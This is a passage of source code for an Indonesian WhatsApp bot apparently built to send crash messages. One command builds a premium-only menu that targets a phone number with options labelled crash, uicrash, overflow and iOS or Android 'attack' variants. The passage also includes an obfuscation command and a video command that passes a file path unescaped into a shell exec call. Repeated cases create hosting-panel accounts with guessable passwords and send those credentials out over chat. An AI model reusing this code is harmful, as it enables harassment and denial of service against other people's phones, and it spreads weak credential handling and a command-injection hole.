await zyn.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'alwiganteng': {
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
				let sections = [{
						title: 'KӨXΛᄃ ПΣЩ',
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ ⋎1͊͠',
							id: `hitam ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ ⋎2͋́̚',
							id: `andro ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ ⋎3͊̚͝',
							id: `attack ${target}`
						}]
					},
					{
						title: '𝐊𝐎𝐗𝐀𝐂 𝐈𝐎𝐒',
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ IӨƧ⋎1͠',
							id: `xios ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ IӨƧ⋎2͐͐͆',
							id: `najis ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ПΣЩ IӨƧ⋎3͒̈́͠',
							id: `iphone ${target}`
						}]
					},
					{
					title: '𝐊𝐎𝐗𝐀𝐂 𝐗 𝐒𝐘𝐒𝐓𝐄𝐌',
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ",
						rows: [{
							title: 'ΛᄂЩI ПΣЩV̷̲͚͔̽̈́͝1̷̡̡̲̞͑̓͐',
							id: `uisystem ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: '͝ΛᄂЩI ПΣЩV̷̲̪̫͙̓̐̽2̷̲͔̝̠͑͆',
							id: `uicrash ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'ΛᄂЩI ПΣЩV̷̲͇̫̠̐̚3̷̲͕͖͚̈́͑',
							id: `bugui ${target}`
						}]
					},
					{
						title: '𝐊𝐎𝐗𝐀𝐂 𝐂𝐑𝐀𝐒𝐇',
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'KӨXΛᄃ ПΣЩ V͆̓͑͠͠͝1̀̔̓̓͝ ',
							id: `crashflow ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'KӨXΛᄃ ПΣЩ V͒̿̔̈́͆͋2͛̈́͋̒̚',
							id: `vasion ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'KӨXΛᄃ ПΣЩ V͐̽̓̕͠3́̾͒̕͝',
							id: `overflow ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'KӨXΛᄃ ПΣЩ V̒̽͌̔͘͘4̿͋̚͝͠͝',
							id: `pantek ${target}`
						}]
					},
					{
						highlight_label: " ⃟༑⌁⃰KӨXΛᄃ ΛƬƬΛᄃKΣЯ🦠",
						rows: [{
							title: 'KӨXΛᄃ ПΣЩ V͋̈́͋͑̾́5̾͑͊̐̐͘',
							id: `pukimak ${target}`
						}]
					}]
let listMessage = {
    title: '§KӨXΛᄃ ПΣЩ§', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "0@newsletter",
 newsletterName: 'Powered By KӨXΛᄃ ПΣЩ', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: zyn.decodeJid(zyn.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: ``
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `  ⃟༑⌁⃰⌜ KӨXΛᄃ ПΣЩ ⌟ ⃟༑⌁⃰ `
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ' ⃟༑⌁⃰⌜ KӨXΛᄃ ПΣЩ ⌟ ⃟༑⌁⃰ཀ͜͡🦠\n𝙋𝙄𝙇𝙄𝙃 𝙋𝙀𝙉𝙔𝙀𝙍𝘼𝙉𝙂𝘼𝙉 𝘿𝙄𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄\n𝙏𝙀𝙆𝘼𝙉 𝙎𝘼𝙇𝘼𝙃 𝙎𝘼𝙏𝙐 𝘽𝙐𝙂 𝘿𝙄𝘽𝘼𝙒𝘼𝙃 𝙄𝙉𝙄',
 subtitle: "KӨXΛᄃ ПΣЩ",
 hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./database/image/Koxac.jpg")}, { upload: zyn.waUploadToServer })) 
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
},  {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"JANGAN DITEKAN\",\"url\":\"https://youtube.con/@alwicrash\",\"merchant_url\":\"https://youtube.com/@alwicrash\"}"
 },
 ]
 })
 })
 }
 }
}, {})

await zyn.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'hdvid' :
case 'hdvideo': 
case 'vidiohd':
case 'tohd': 
case 'vidhd' : {
const { TelegraPh } = require('../database/lib//uploader');
const { exec } = require('child_process');
const who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? zyn.user.jid : m.sender;
//const name = await zyn.getName(who);
const q = m.quoted ? m.quoted : m;
const mime = (q.msg || q).mimetype || '';
if (!mime) return m.reply(`Mana vidio nya bang?`);
reply(mess.wait);
const media = await zyn.downloadAndSaveMediaMessage(q);
const url = await TelegraPh(media);
const output = 'output.mp4'; // Nama file output
// Menggunakan ffmpeg untuk meningkatkan resolusi video ke 1080p
exec(`ffmpeg -i ${media} -s 1280x720 -c:v libx264 -c:a copy ${output}`, (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  console.log(`stdout: ${stdout}`);
  console.error(`stderr: ${stderr}`);

  // Mengunggah video yang telah ditingkatkan resolusinya
  zyn.sendMessage(m.chat, { caption: `_Success To HD Video_`, video: { url: output }}, {quoted: m});
})
await sleep(60000)
fs.unlinkSync(output)
fs.unlinkSync(media)
}
break

case 'enc': case 'encrypt': case 'obfuscate':
{
if (!q) return reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
reply(`${meg.result}`)
}
break

case '1gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "1024"
let email = username + "koxac@alwi.com"
akunlo = "https://g.top4top.io/.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '2gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "2024"
let cpu = "70"
let disk = "2024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '3gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '4gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "4024"
let cpu = "80"
let disk = "4024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '5gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "5024"
let cpu = "100"
let disk = "5024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '6gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "6024"
let cpu = "160"
let disk = "6024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '7gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "7024"
let cpu = "170"
let disk = "7024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name+' - 1gb',
"description": 'Create with '+namabot,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return zyn(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await reply(`Sukses menambahkan User dan Server

Type: user

Id: ${user.id}
Username: ${user.username}
Email: ${user.email}
Name: ${user.first_name} ${user.last_name}
Memory: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
Disk: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk + 'MB'}
Cpu: ${server.limits.cpu === 0 ? 'Unlimited' : server.limits.cpu + '%'}`)
}
break

case '8gb': {
if(!isPremium){
reply(mess.only.premium)
}
if (!isOwner) return reply(mess.only.owner)
let t = text.split(','); 
if (t.length < 2) return reply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = global.eggsnya
let loc = global.location
let memo = "8024"
let cpu = "180"
let disk = "8024"
let email = username + "Zyn@Tzy.com"
akunlo = "https://g.top4top.io/p_3194iz70l0.jpg" 
if (!u) return
let d = (await zyn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+'001'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
reply(`User ID: ${user.id}`)
let ctf = `Hai @${m.sender.split('@')[0]}
 Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut ⇩⇩

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
zyn.sendMessage(u, { image: { url: 'https://g.top4top.io/p_3194iz70l0.jpg' }, caption: ctf }, { quoted: m })
let data2 = await f2.json()
let startup_cmd = data2.attributes.startup
let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
